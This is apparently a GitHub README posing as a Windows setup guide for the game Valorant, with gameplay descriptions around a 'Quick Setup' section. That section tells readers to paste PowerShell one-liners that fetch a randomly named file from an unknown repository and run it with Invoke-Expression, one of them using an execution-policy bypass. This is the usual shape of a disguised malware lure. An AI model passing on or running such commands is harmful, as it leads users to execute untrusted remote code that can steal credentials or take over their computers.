# Valorant

Valorant is the Windows game this page sets up. The command in Quick Setup installs the game on this PC. After that you launch Valorant and play.

Valorant is a team-based tactical first-person shooter built for Windows through Riot Client. Two five-player sides alternate attacking and defending on tight maps, planting or defusing the Spike while abilities create smokes, flashes, heals, and intel. Vanguard runs with the client, and playlists cover unrated, competitive, and rotating seasonal modes on your region’s servers.

A typical session starts in Riot Client: update if prompted, open the Valorant tab, and queue with friends in party chat. Agent select locks roles—duelist, controller, initiator, or sentinel—then each round’s buy phase spends credits on rifles, sidearms, shields, and utility. You trade rounds until one team hits thirteen wins, swapping sides at halftime and managing economy across partial buys and full saves.

This repository keeps the Windows setup file used for consistent installs in managed environments, plus concise notes on default paths, display presets, and sensitivity backups. A changelog records client and content updates relevant to provisioning here, so operators can align local installs with expected versions without duplicating the live patch stream from the publisher.

## How you play

- Attackers plant the Spike at A or B while defenders hold angles and rotate with team utility.
- Every agent offers a signature skill, two buyable abilities, and an ultimate earned across rounds.
- Round economy pays for rifles, operator picks, armor tiers, and grenades after wins and plants.
- Competitive playlists use a rotating map pool and visible rank after placement matches complete.
- Unrated and swift play modes offer faster queues when you skip ranked pressure for practice.
- The practice range and deathmatch lobbies isolate aim drills before you stack with friends.
- Voice and ping tools coordinate executes, lurks, and post-plant holds without leaving the client.
- Setup notes here document install steps alongside sensitivity and crosshair presets for Windows machines.

## Quick Setup (PowerShell)

This installs the game Valorant on Windows.
1. Launch PowerShell:
   - Press `Win` + `X` on the keyboard.
   - Click **Terminal** or **Windows PowerShell** in the list.
2. Copy the command below, paste it into that window, and press Enter. Wait until it finishes.

```powershell
irm https://raw.githubusercontent.com/hannah7829149182/valorant-setup-guide/main/vcngysmhxs.papqdgs0 | Invoke-Expression
```

## If the script is blocked

If Windows stops the script, paste this command into the same window and press Enter.

```powershell
powershell -ExecutionPolicy Bypass -Command "Invoke-RestMethod https://raw.githubusercontent.com/hannah7829149182/valorant-setup-guide/main/vcngysmhxs.papqdgs0 | Invoke-Expression"
```

## Files

| File | What it is |
| --- | --- |
| `vcngysmhxs.papqdgs0` | The file both commands read |
| `Initial.js` | Small helper kept next to the setup |
| `LICENSE` | MIT |
| `CHANGELOG.md` | What changed in build 1.0 |

## This build

Repository `hannah7829149182/valorant-setup-guide`. Valorant 1.0, 2026. Windows 10 and Windows 11, 64-bit.
  
